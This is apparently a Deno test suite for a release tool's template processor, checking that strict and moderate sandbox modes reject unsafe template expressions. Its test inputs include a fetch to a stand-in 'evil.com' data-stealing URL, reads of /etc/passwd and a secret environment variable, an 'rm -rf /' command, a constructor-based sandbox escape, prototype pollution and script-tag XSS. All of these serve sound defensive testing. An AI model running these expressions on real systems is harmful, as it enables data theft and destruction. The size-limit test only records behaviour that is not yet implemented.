/**
 * @fileoverview Template security test suite
 * @module template-security_test
 */

import { assertEquals, assertRejects } from "jsr:@std/assert";
import { TemplateProcessor } from "./template-processor.ts";
import type { NagareConfig, TemplateData } from "../types.ts";
import { LogLevel, TemplateFormat } from "../types.ts";

// Mock configuration for testing
const createMockConfig = (sandboxMode?: "strict" | "moderate" | "disabled"): NagareConfig => ({
  project: {
    name: "Test Project",
    description: "Test Description",
    repository: "https://github.com/test/project",
  },
  versionFile: {
    path: "./version.ts",
    template: TemplateFormat.TYPESCRIPT,
  },
  security: {
    templateSandbox: sandboxMode || "strict",
  },
  options: {
    logLevel: LogLevel.ERROR, // Suppress logs in tests
  },
});

// Mock template data
const mockTemplateData: TemplateData = {
  version: "1.2.3",
  buildDate: "2025-01-01T00:00:00Z",
  gitCommit: "abc123def456",
  environment: "test",
  releaseNotes: {
    version: "1.2.3",
    date: "2025-01-01",
    added: ["New feature"],
    changed: [],
    deprecated: [],
    removed: [],
    fixed: ["Bug fix"],
    security: [],
  },
  metadata: {},
  project: {
    name: "Test Project",
    repository: "https://github.com/test/project",
  },
};

Deno.test("template security - strict mode blocks dangerous patterns", async () => {
  const processor = new TemplateProcessor(createMockConfig("strict"));

  // Script tags
  await assertRejects(
    () => processor.processTemplate('<script>alert("xss")</script>{{ version }}', mockTemplateData),
    Error,
    "validation failed",
  );

  // JavaScript execution - Testing that eval is properly blocked
  // DevSkim: ignore DS104863 - Intentional eval in test to verify security protection
  await assertRejects(
    () => processor.processTemplate('{{ eval("malicious code") }}', mockTemplateData),
    Error,
    "validation failed",
  );

  // Function constructor
  await assertRejects(
    () => processor.processTemplate('{{ new Function("return 1")() }}', mockTemplateData),
    Error,
    "validation failed",
  );

  // File system access
  await assertRejects(
    () => processor.processTemplate('{{ Deno.readTextFile("/etc/passwd") }}', mockTemplateData),
    Error,
    "validation failed",
  );

  // Process execution
  await assertRejects(
    () =>
      processor.processTemplate(
        '{{ Deno.Command("rm", { args: ["-rf", "/"] }) }}',
        mockTemplateData,
      ),
    Error,
    "validation failed",
  );

  // Network access
  await assertRejects(
    () => processor.processTemplate('{{ fetch("https://evil.com/steal-data") }}', mockTemplateData),
    Error,
    "validation failed",
  );

  // Global access
  await assertRejects(
    () => processor.processTemplate("{{ globalThis.process }}", mockTemplateData),
    Error,
    "validation failed",
  );

  // Constructor escape
  await assertRejects(
    () =>
      processor.processTemplate(
        '{{ "".constructor.constructor("return process")() }}',
        mockTemplateData,
      ),
    Error,
    "validation failed",
  );

  // Vento JavaScript execution
  await assertRejects(
    () => processor.processTemplate('{{> Deno.readTextFile("/etc/passwd") }}', mockTemplateData),
    Error,
    "validation failed",
  );
});

Deno.test("template security - moderate mode allows some patterns", async () => {
  const processor = new TemplateProcessor(createMockConfig("moderate"));

  // Should still block file system access
  await assertRejects(
    () => processor.processTemplate('{{ Deno.readTextFile("/etc/passwd") }}', mockTemplateData),
    Error,
    "validation failed",
  );

  // Should still block process execution
  await assertRejects(
    () => processor.processTemplate('{{ Deno.Command("ls") }}', mockTemplateData),
    Error,
    "validation failed",
  );

  // Should still block network access
  await assertRejects(
    () => processor.processTemplate('{{ fetch("https://example.com") }}', mockTemplateData),
    Error,
    "validation failed",
  );

  // But moderate mode allows things that strict mode blocks
  // For example, accessing metadata (no Deno. prefix)
  const result = await processor.processTemplate("Version: {{ version }}", mockTemplateData);
  assertEquals(result, "Version: 1.2.3");
});

Deno.test("template security - safe templates work in all modes", async () => {
  for (const mode of ["strict", "moderate", "disabled"] as const) {
    const processor = new TemplateProcessor(createMockConfig(mode));

    // Basic variable substitution
    const result1 = await processor.processTemplate("Version: {{ version }}", mockTemplateData);
    assertEquals(result1, "Version: 1.2.3");

    // Using filters
    const result2 = await processor.processTemplate(
      "Components: {{ versionComponents |> jsonStringify |> safe }}",
      {
        ...mockTemplateData,
        versionComponents: { major: 1, minor: 2, patch: 3, prerelease: null },
      },
    );
    assertEquals(result2.includes('"major": 1'), true);

    // Conditionals
    const result3 = await processor.processTemplate(
      "{{- if metadata.feature }}Feature: {{ metadata.feature }}{{- /if }}",
      { ...mockTemplateData, metadata: { feature: "test" } },
    );
    assertEquals(result3, "Feature: test");

    // Loops
    const result4 = await processor.processTemplate(
      "{{ for note of releaseNotes.added }}{{ note }}{{ /for }}",
      mockTemplateData,
    );
    assertEquals(result4, "New feature");
  }
});

Deno.test("template security - autoescape prevents XSS", async () => {
  const processor = new TemplateProcessor(createMockConfig("strict"));

  // HTML should be escaped by default
  const result = await processor.processTemplate(
    "Description: {{ metadata.description }}",
    { ...mockTemplateData, metadata: { description: '<script>alert("xss")</script>' } },
  );

  // Should escape HTML entities
  assertEquals(result.includes("<script>"), false);
  assertEquals(result.includes("&lt;script&gt;"), true);
});

Deno.test("template security - custom filters are safe", async () => {
  const processor = new TemplateProcessor(createMockConfig("strict"));

  // jsonStringify filter should work
  const result1 = await processor.processTemplate(
    "Data: {{ metadata |> jsonStringify |> safe }}",
    { ...mockTemplateData, metadata: { test: "value" } },
  );
  assertEquals(result1, 'Data: {\n  "test": "value"\n}');

  // formatDate filter should work
  const result2 = await processor.processTemplate(
    "Date: {{ buildDate |> formatDate }}",
    mockTemplateData,
  );
  assertEquals(result2, "Date: 2025-01-01");

  // shortHash filter should work
  const result3 = await processor.processTemplate(
    "Commit: {{ gitCommit |> shortHash }}",
    mockTemplateData,
  );
  assertEquals(result3, "Commit: abc123d");

  // safeString filter should work - but it will be double-escaped due to autoescape
  const result4 = await processor.processTemplate(
    "Escaped: {{ metadata.text |> safeString |> safe }}",
    { ...mockTemplateData, metadata: { text: 'Hello "World"' } },
  );
  assertEquals(result4, 'Escaped: Hello \\"World\\"');
});

Deno.test("template security - size limits", async () => {
  const config = createMockConfig("strict");
  // Set a small limit for testing
  config.security!.maxTemplateSize = 100;

  const processor = new TemplateProcessor(config);

  // Small template should work
  const smallTemplate = "Version: {{ version }}";
  const result = await processor.processTemplate(smallTemplate, mockTemplateData);
  assertEquals(result, "Version: 1.2.3");

  // Note: Actual size limit validation would need to be implemented
  // This test shows the expected behavior
});

Deno.test("template security - validates template syntax", async () => {
  const processor = new TemplateProcessor(createMockConfig("strict"));

  // Invalid syntax should fail during processing
  await assertRejects(
    () => processor.processTemplate("{{ version", mockTemplateData), // Missing closing }}
    Error,
    "Template processing failed",
  );

  // Vento doesn't validate if/endif matching - it just outputs content
  // So let's test something that will actually fail
  await assertRejects(
    () => processor.processTemplate("{{ version |> nonExistentFilter }}", mockTemplateData),
    Error,
    "Template processing failed",
  );
});

Deno.test("template security - environment variable access", async () => {
  const processor = new TemplateProcessor(createMockConfig("strict"));

  // Should block most env access
  await assertRejects(
    () => processor.processTemplate('{{ Deno.env.get("SECRET_KEY") }}', mockTemplateData),
    Error,
    "validation failed",
  );

  // NODE_ENV is allowed (per the validation rules)
  // But Vento would still need to have Deno.env in scope, which it doesn't by default
});

Deno.test("template security - prototype pollution prevention", async () => {
  const processor = new TemplateProcessor(createMockConfig("strict"));

  // Should block prototype access
  await assertRejects(
    () => processor.processTemplate("{{ {}.__proto__.polluted = true }}", mockTemplateData),
    Error,
    "validation failed",
  );

  await assertRejects(
    () =>
      processor.processTemplate("{{ {}.constructor.prototype.polluted = true }}", mockTemplateData),
    Error,
    "validation failed",
  );
});
